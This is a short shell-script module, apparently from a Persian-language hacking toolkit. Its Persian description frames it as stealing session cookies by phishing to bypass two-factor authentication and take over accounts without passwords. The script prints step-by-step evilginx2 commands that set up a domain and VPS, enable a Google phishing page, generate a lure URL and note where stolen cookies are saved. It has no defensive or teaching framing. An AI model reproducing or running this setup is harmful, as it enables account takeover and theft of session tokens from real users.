DESC="دزدیدن کوکی سشن با فیشینگ (بایپس 2FA)"
REQ="دامنه + VPS"
RISK="HIGH"
NOTE="این تنها راه تصاحب اکانت بدون پسورد است"

termux(){ echo "# روی VPS اجرا کن، نه ترموکس"; }

kali(){
cat <<'EOF'
git clone https://github.com/kgretzky/evilginx2 && cd evilginx2
go build
./evilginx2 -p phishlets
# داخل شل:
config domain yourdomain.com
config ip <VPS_IP>
phishlets hostname google login.yourdomain.com
phishlets enable google
lures create google
lures get-url 0
# کوکی‌ها در ~/.evilginx2/ ذخیره می‌شوند
EOF
}
